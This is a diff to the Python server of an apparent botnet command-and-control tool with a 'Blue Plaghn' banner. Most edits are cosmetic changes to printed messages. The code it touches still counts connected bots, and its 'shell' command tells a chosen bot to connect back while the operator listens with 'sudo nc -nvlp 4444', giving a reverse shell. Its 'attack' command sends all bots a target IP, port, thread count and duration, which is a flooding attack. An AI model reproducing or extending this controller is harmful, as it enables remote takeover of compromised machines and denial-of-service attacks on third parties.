@@ -9,7 +9,7 @@ connected_clients = []
 clients_lock = threading.Lock()
 
 def handle_client(client_socket, address):
-    print(f"Connection from {address}")
+    print(f"[+] Connection from {address}")
 
     # Add the client socket to the list of connected clients
     with clients_lock:
@@ -19,14 +19,13 @@ def handle_client(client_socket, address):
         try:
             message = client_socket.recv(1024).decode()
             if message == "":
-                print(f"Connection with {address} closed.")
+                print(f"[-] Connection with {address} closed.")
                 break
 
-            print(f"Received from {address}: {message}")
-            # Perform any action based on the received message
+            print(f"[+] Received from {address}: {message}")
 
         except ConnectionResetError:
-            print(f"Connection with {address} closed.")
+            print(f"[-] Connection with {address} closed.")
             break
 
     # Remove the client socket from the list of connected clients
@@ -34,7 +33,7 @@ def handle_client(client_socket, address):
         if client_socket in connected_clients:
             connected_clients.remove(client_socket)
     client_socket.close()
-    print(f"Connection with {address} closed.")
+    print(f"[-] Connection with {address} closed.")
 
 def send_message_to_clients(message):
     # Send the same message to all connected clients
@@ -53,7 +52,7 @@ def start_server():
     server_socket.bind((host, port))
     server_socket.listen(5)
 
-    print(f"Server listening on {host}:{port}\n")
+    print(f"[*] Server listening on {host}:{port}\n")
 
     # Start a new thread to handle each client
     client_acceptor = threading.Thread(target=accept_clients, args=(server_socket,))
@@ -78,10 +77,12 @@ def send_messages():
  |  _ <| | | | |/ _ \ |  ___/ |/ _` |/ _` | '_ \ 
  | |_) | | |_| |  __/ | |   | | (_| | (_| | | | |
  |____/|_|\__,_|\___| |_|   |_|\__,_|\__, |_| |_|
-                                       __/ |      
-                                      |___/       
+                                      __/ |      
+                                     |___/       
               
               Made by: https://github.com/LTWeaver
+              use 'help' to get started
+              use 'quit' to quit (will have to reboot server if you dont use this)
 \n\nBots Connected: {len(connected_clients)}""")
         message_to_send = input("\n\n\n>>>: ")
         os.system('clear')
@@ -94,7 +95,7 @@ def send_messages():
             for client_socket in connected_clients:
                 client_socket.close()
             connected_clients.clear()  # Clear the list of connected clients
-            print("All clients removed. Quitting...")
+            print("[*] All clients removed. Quitting... (Press Ctrl+C to exit)")
             sys.exit()  # Terminate the script using sys.exit()
 
         # Check if the input is "shell"
@@ -106,7 +107,8 @@ def send_messages():
                 print(f"{idx}. {client_address}")
 
             # Prompt the user to select a client for a shell
-            selected_client = input("\nSelect a client for a shell (enter the number): ")
+            selected_client = input("\nSelect a client for a shell (enter the number): \n")
+            print("[*] Ctr-c to stop listening/exit shell\n")
             try:
                 selected_index = int(selected_client) - 1
                 if 0 <= selected_index < len(connected_clients):
@@ -114,9 +116,9 @@ def send_messages():
                     send_message_to_client(target_ip, "shell")
                     os.system("sudo nc -nvlp 4444")
                 else:
-                    print("Invalid client selection.")
+                    print("[!] Invalid client selection.")
             except ValueError:
-                print("Invalid input. Please enter a number.")
+                print("[!] Invalid input. Please enter a number.")
 
         elif message_to_send == "remove":
             print("Connected Clients:")
@@ -141,13 +143,13 @@ def send_messages():
             threads = input("Thread ammount (max=70): ")
             if int(threads) > 70:
                 threads = "70"
-                print("Too many threads, setting to max")
+                print("[!] Too many threads, setting to max")
             timer = input("Attack length (s): ")
             port = input("Port: ")
 
             # Send the "attack" command along with IP, threads, and timer to all clients
             send_message_to_clients(f"attack {ip} {threads} {timer} {port}")
-            print(f"\nAttack on {ip}:{port} with {threads} threads for {timer} seconds started...")
+            print(f"[*] Attack on {ip}:{port} with {threads} threads for {timer} seconds started...")
 
         else:
             # Send the message to all clients
@@ -173,7 +175,7 @@ def remove_client(selected_client):
         for client_socket in connected_clients:
             client_socket.close()
         connected_clients.clear()  # Clear the list of connected clients
-        print("All clients removed.")
+        print("[*] All clients removed.")
     else:
         try:
             selected_index = int(selected_client) - 1
@@ -185,7 +187,7 @@ def remove_client(selected_client):
 
                 client_socket.close()
                 connected_clients.remove(client_socket)
-                print(f"Client {selected_client} removed.")
+                print(f"[*] Client {selected_client} removed.")
 
         except Exception as e:
             print(e)
